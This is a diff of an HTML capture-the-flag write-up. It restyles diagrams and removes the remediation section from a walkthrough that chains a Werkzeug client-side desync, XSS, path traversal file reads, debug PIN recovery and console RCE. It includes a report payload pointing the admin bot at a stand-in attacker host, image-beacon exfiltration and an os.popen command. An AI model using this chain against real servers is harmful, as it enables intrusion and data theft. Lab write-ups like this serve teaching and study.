@@ -100,7 +100,6 @@
                     <li><a href="#s8">Attack Chain Summary</a></li>
                     <li><a href="#s9">Why Other Approaches Failed</a></li>
                     <li><a href="#s10">Key Takeaways</a></li>
-                    <li><a href="#s11">Remediation</a></li>
                 </ol>
             </nav>
 
@@ -125,29 +124,50 @@
                 <p>The application is a Flask web app backed by MySQL, using JWT for authentication and Selenium
                     (headless Chromium) to simulate an admin bot that reviews reported users.</p>
 
-                <pre><code>+--------------------------------------------------------------+
-|                   FLASK (:1337)                              |
-|                                                              |
-|  /                    -> Landing page (GET + POST)           |
-|  /login               -> Login page                          |
-|  /register            -> Registration page                   |
-|  /profile/&lt;uid&gt;       -> View user profile                   |
-|  /settings            -> Edit user profile                   |
-|  /ipc_documents       -> Admin-only: view IPC submissions    |
-|  /go?to=&lt;url&gt;         -> Open redirect                       |
-|                                                              |
-|  /api/register        -> Create account                      |
-|  /api/login           -> Authenticate, get JWT session       |
-|  /api/profile/me/update -> Update profile fields             |
-|  /api/report          -> Report user (triggers admin bot)    |
-|  /api/ipc_submit      -> Upload .png file                    |
-|  /api/ipc_download    -> Admin-only: download IPC file       |
-|                                                              |
-|  Auth: JWT (HS256, runtime-generated secret)                 |
-|  Bot: Selenium (headless Chromium)                           |
-|  CSP: None                                                   |
-|  Debug: Werkzeug debugger enabled (/console)                 |
-+--------------------------------------------------------------+</code></pre>
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Route</th>
+                                <th>Purpose</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><code>/</code></td><td>Landing page, GET and POST</td></tr>
+                            <tr><td><code>/login</code></td><td>Login page</td></tr>
+                            <tr><td><code>/register</code></td><td>Registration page</td></tr>
+                            <tr><td><code>/profile/&lt;uid&gt;</code></td><td>View user profile</td></tr>
+                            <tr><td><code>/settings</code></td><td>Edit user profile</td></tr>
+                            <tr><td><code>/ipc_documents</code></td><td>Admin-only IPC submissions</td></tr>
+                            <tr><td><code>/go?to=&lt;url&gt;</code></td><td>Open redirect</td></tr>
+                            <tr><td><code>/api/register</code></td><td>Create account</td></tr>
+                            <tr><td><code>/api/login</code></td><td>Authenticate and set JWT session</td></tr>
+                            <tr><td><code>/api/profile/me/update</code></td><td>Update profile fields</td></tr>
+                            <tr><td><code>/api/report</code></td><td>Trigger the admin bot</td></tr>
+                            <tr><td><code>/api/ipc_submit</code></td><td>Upload <code>.png</code> file</td></tr>
+                            <tr><td><code>/api/ipc_download</code></td><td>Admin-only IPC file download</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="flow-mini">
+                    <div class="flow-card">
+                        <strong>Auth</strong>
+                        <p>JWT signed with HS256 and a runtime-generated secret.</p>
+                    </div>
+                    <div class="flow-card">
+                        <strong>Bot</strong>
+                        <p>Selenium with headless Chromium reviews reported users.</p>
+                    </div>
+                    <div class="flow-card">
+                        <strong>CSP</strong>
+                        <p>No Content Security Policy.</p>
+                    </div>
+                    <div class="flow-card">
+                        <strong>Debug</strong>
+                        <p>Werkzeug debugger exposed at <code>/console</code>.</p>
+                    </div>
+                </div>
 
                 <h3>Flag Location</h3>
 
@@ -466,25 +486,46 @@ botsHTML += `&lt;img src='${botsData[i].src}' class='bots-img'&gt;`;</code></pre
                 <p>CSD exploits a mismatch between how the browser and the server handle HTTP request bodies on
                     keep-alive connections.</p>
 
-                <pre><code>+------------+                    +--------------+
-|  Browser   | --- TCP conn ---&gt; |  Werkzeug    |
-|  (Chrome)  |                    |  (2.1.0)     |
-|            |                    |              |
-|  1. POST / | ----------------&gt; | Process POST |
-|  body: smuggled GET             | Don't read   |
-|            |                    | full body    |
-|            | &lt;---------------- | Send response|
-|            |                    |              |
-|  2. GET /next-resource          | But buffer   |
-|     (automatic) -------------&gt; | still has    |
-|            |                    | smuggled GET |
-|            |                    | -&gt; process it|
-|            | &lt;---------------- | Smuggled resp|
-|            |                    |              |
-|  Browser receives smuggled      |              |
-|  response thinking it's the     |              |
-|  response to request #2         |              |
-+------------+                    +--------------+</code></pre>
+                <div class="flow-chain">
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Browser</span>
+                            <h3>Send POST with a hidden request body</h3>
+                            <p>Chrome opens a keep-alive TCP connection and sends <code>POST /</code> with a smuggled
+                                GET request inside the body.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Werkzeug 2.1.0</span>
+                            <h3>Respond without draining the body</h3>
+                            <p>The server processes the POST and replies, but the smuggled bytes remain queued on the
+                                same connection.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Browser</span>
+                            <h3>Send the next automatic request</h3>
+                            <p>The browser asks for the next resource on the reused connection.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Desync</span>
+                            <h3>Server consumes the smuggled request first</h3>
+                            <p>Werkzeug processes the leftover GET and sends the attacker-controlled response.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Impact</span>
+                            <h3>Browser accepts the wrong response</h3>
+                            <p>Chrome treats the smuggled response as the answer to its legitimate second request,
+                                executing the payload in the admin context.</p>
+                        </div>
+                    </div>
+                </div>
 
                 <h3>Why This Bypasses Everything</h3>
 
@@ -502,7 +543,28 @@ botsHTML += `&lt;img src='${botsData[i].src}' class='bots-img'&gt;`;</code></pre
 
                 <p>With the CSD understood, the full attack chain crystallized:</p>
 
-                <pre><code>CSD -&gt; XSS as admin -&gt; read files via ipc_download -&gt; calculate debug PIN -&gt; /console -&gt; RCE -&gt; flag</code></pre>
+                <div class="attack-steps">
+                    <div class="attack-step">
+                        <span class="attack-step-label">CSD</span>
+                        <p>Desynchronize the admin bot's browser connection.</p>
+                    </div>
+                    <div class="attack-step">
+                        <span class="attack-step-label">XSS</span>
+                        <p>Execute JavaScript as admin on <code>localhost:1337</code>.</p>
+                    </div>
+                    <div class="attack-step">
+                        <span class="attack-step-label">File read</span>
+                        <p>Use <code>ipc_download</code> path traversal to recover PIN inputs.</p>
+                    </div>
+                    <div class="attack-step">
+                        <span class="attack-step-label">Debug PIN</span>
+                        <p>Calculate the Werkzeug console PIN.</p>
+                    </div>
+                    <div class="attack-step">
+                        <span class="attack-step-label">RCE</span>
+                        <p>Use <code>/console</code> to execute code and read the flag.</p>
+                    </div>
+                </div>
 
                 <h3>The Attacker Server</h3>
 
@@ -723,39 +785,63 @@ ngrok http 5000
 
                 <h2 id="s8">8. Attack Chain Summary</h2>
 
-                <pre><code>+----------+-----------------------------------------------------------+
-| Step 1   | Register + Login                                          |
-|          | Create account, get JWT session cookie                    |
-+----------+-----------------------------------------------------------+
-| Step 2   | Set Up Attacker Server                                    |
-|          | Flask server with /exploit (CSD trigger) and / (payload) |
-|          | Expose via ngrok or VPN IP                                |
-+----------+-----------------------------------------------------------+
-| Step 3   | Trigger Bot via Report                                    |
-|          | id = "../go?to=https://attacker/exploit"                  |
-|          | Path traversal + open redirect -&gt; bot on attacker page   |
-+----------+-----------------------------------------------------------+
-| Step 4   | Client-Side Desync -&gt; XSS                                 |
-|          | Auto-submitting form POSTs to localhost:1337              |
-|          | Smuggled GET left in TCP buffer                           |
-|          | Browser's next request gets smuggled response             |
-|          | JS payload executes in admin context on localhost:1337    |
-+----------+-----------------------------------------------------------+
-| Step 5   | File Exfiltration via ipc_download Path Traversal         |
-|          | XSS reads: /sys/class/net/eth0/address (MAC)             |
-|          |            /proc/sys/kernel/random/boot_id               |
-|          |            /proc/self/cgroup                              |
-|          | Data exfiltrated via Image beacon to listener             |
-+----------+-----------------------------------------------------------+
-| Step 6   | Calculate Werkzeug Debug PIN                              |
-|          | SHA1(public_bits + private_bits + salts)                  |
-|          | public: root, flask.app, Flask, flask/app.py path        |
-|          | private: MAC decimal + boot_id + cgroup_id               |
-+----------+-----------------------------------------------------------+
-| Step 7   | Debug Console RCE -&gt; Flag                                 |
-|          | Navigate to /console, enter PIN                           |
-|          | os.popen('cat /flag*.txt').read()                         |
-+----------+-----------------------------------------------------------+</code></pre>
+                <div class="flow-chain">
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 1</span>
+                            <h3>Register + login</h3>
+                            <p>Create an account and get a JWT session cookie.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 2</span>
+                            <h3>Set up attacker server</h3>
+                            <p>Serve <code>/exploit</code> for the CSD trigger and <code>/</code> for the XSS payload,
+                                exposed via ngrok or VPN IP.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 3</span>
+                            <h3>Trigger bot via report</h3>
+                            <p><code>id="../go?to=https://attacker/exploit"</code> combines path traversal and open
+                                redirect to put the bot on the attacker page.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 4</span>
+                            <h3>Client-Side Desync to XSS</h3>
+                            <p>An auto-submitted form POSTs to <code>localhost:1337</code>; the smuggled GET stays in
+                                the TCP buffer and the next browser request receives the attacker response.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 5</span>
+                            <h3>File exfiltration</h3>
+                            <p>XSS abuses <code>ipc_download</code> path traversal to read the MAC, boot ID and cgroup
+                                data, then exfiltrates with an image beacon.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 6</span>
+                            <h3>Calculate Werkzeug PIN</h3>
+                            <p>Rebuild the SHA1 input from public bits and private bits: root, Flask metadata, MAC,
+                                boot ID and cgroup ID.</p>
+                        </div>
+                    </div>
+                    <div class="flow-step">
+                        <div>
+                            <span class="flow-kicker">Step 7</span>
+                            <h3>Debug console RCE</h3>
+                            <p>Enter the PIN on <code>/console</code> and read the flag with
+                                <code>os.popen('cat /flag*.txt').read()</code>.</p>
+                        </div>
+                    </div>
+                </div>
 
                 <h2 id="s9">9. Why Other Approaches Failed</h2>
 
@@ -876,62 +962,6 @@ ngrok http 5000
                         </tr>
                     </tbody>
                 </table>
-
-                <h2 id="s11">11. Remediation</h2>
-
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Vulnerability</th>
-                            <th>Fix</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td>Client-Side Desync</td>
-                            <td>Upgrade Werkzeug to version 2.1.1 or later where the CSD vulnerability is patched. Use a
-                                production WSGI server (Gunicorn, uWSGI) instead of Werkzeug's development server.</td>
-                        </tr>
-                        <tr>
-                            <td>Debug mode enabled</td>
-                            <td>Remove <code>debug=True</code> from <code>app.run()</code>. Never enable debug mode
-                                outside local development.</td>
-                        </tr>
-                        <tr>
-                            <td>Open redirect</td>
-                            <td>Validate the <code>to</code> parameter against an allowlist of trusted domains. At
-                                minimum, reject non-HTTPS schemes and external domains.</td>
-                        </tr>
-                        <tr>
-                            <td>Unvalidated bot ID</td>
-                            <td>Enforce numeric-only validation: <code>if not user_id.isdigit(): return error</code>.
-                                This prevents path traversal in the bot URL construction.</td>
-                        </tr>
-                        <tr>
-                            <td>Path traversal in ipc_download</td>
-                            <td>Use <code>os.path.basename()</code> to strip directory components, or use
-                                <code>werkzeug.utils.secure_filename()</code>.</td>
-                        </tr>
-                        <tr>
-                            <td>Missing CSP</td>
-                            <td>Add a strict Content-Security-Policy:
-                                <code>default-src 'self'; script-src 'nonce-[random]'</code>. While this would not
-                                prevent CSD, it raises the bar significantly for exploitation.</td>
-                        </tr>
-                        <tr>
-                            <td>HttpOnly cookies</td>
-                            <td>Flask's session cookies are HttpOnly by default, which is correct. Explicitly setting
-                                <code>SESSION_COOKIE_HTTPONLY = True</code> guards against accidental regression.</td>
-                        </tr>
-                    </tbody>
-                </table>
-
-                <div class="pwned-banner">
-                    <span class="pwned-icon"><i class="fas fa-flag"></i></span>
-                    <div class="pwned-text">Machine Pwned</div>
-                    <p class="pwned-sub">Client-Side Desync (Werkzeug 2.1.0) + Open Redirect + Path Traversal + Debug
-                        PIN Calculation + RCE via /console</p>
-                </div>
 
             </div>
         </article>
